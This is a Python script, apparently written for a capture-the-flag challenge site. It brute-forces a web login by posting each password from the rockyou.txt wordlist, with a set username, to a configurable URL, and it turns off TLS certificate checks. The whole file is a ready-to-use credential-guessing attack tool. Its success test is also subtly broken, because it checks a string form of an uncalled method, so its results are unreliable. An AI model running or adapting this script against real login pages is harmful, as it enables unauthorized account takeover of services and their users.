#!/usr/bin/python

#requirements:
# sudo pip install termcolor
# sudo pip install requests


# if you get the following error with requests,
# "ImportError: No module named packages.urllib3.exceptions"
# run the following command to fix it.
# sudo pip install --upgrade requests==2.4.3

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored

#Suppresses warning about unverified HTTPS traffic
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = 'XXX' #enter URL of challenge site

passwords = open("rockyou.txt", "r")
# If password is not found in rockyou, swap the dictionary file (I use a custom dictionary file)

def brute():
    for password in passwords:
        password = password.strip('\n')
        if password == "":
            pass
        else:
        # FORM DATA
            print("sending password %s" %(password))
            data = {
                'Pw': password,
                'Username': "XXX", #change this value based on the username you are trying to pw brute
            }
        # Not sure if we need to use redirects or not.
            x = requests.post(url, allow_redirects=False,verify=False, data=data)
            q = x.json

            if '200' in str(q):
                print(colored('Cha-Ching! password: ', 'yellow') + colored(password, 'yellow'))
                break
            else:
                continue

# Main Routine
brute()
